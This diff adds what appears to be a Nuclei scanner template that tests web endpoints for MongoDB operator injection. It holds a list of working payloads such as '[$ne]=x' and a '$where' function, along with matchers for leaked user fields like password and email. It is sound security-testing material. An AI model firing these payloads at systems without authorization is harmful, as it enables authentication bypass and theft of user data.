@@ -1,0 +1,59 @@
+id: nosqli-operator-injection
+
+info:
+  name: NoSQL Injection - Operator Injection via Parameter Pollution
+  author: erebos
+  severity: high
+  description: |
+    Tests for NoSQL operator injection by appending MongoDB query operators
+    to existing parameters. This catches the common pattern where user input
+    is passed directly to db.collection.find() without sanitization.
+    Example: /usersearch?login[$ne]=x returns all users.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+    - https://nullsweep.com/nosql-injection-cheatsheet/
+  metadata:
+    max-request: 6
+  tags: nosql,nosqli,mongodb,injection,dast
+
+variables:
+  original: "{{randstr}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    payloads:
+      operator:
+        - "[$ne]=x"
+        - "[$gt]="
+        - "[$regex]=.{0,}"
+        - "[$nin][]=__invalid__"
+        - "[$exists]=true"
+        - "[$where]=function(){return true;}"
+
+    fuzzing:
+      - part: request
+        type: suffix
+        mode: single
+        fuzz:
+          - "{{operator}}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "len(body) > 100"
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          # Data leakage indicators — response contains structured data
+          - "(<td>|<tr>|\"login\"|\"email\"|\"name\"|\"user\"|\"password\"|\"_id\")"
+          # MongoDB errors that confirm NoSQL backend
+          - "(MongoError|CastError|BSONTypeError|\\$where|\\$ne|\\$gt)"
+        condition: or
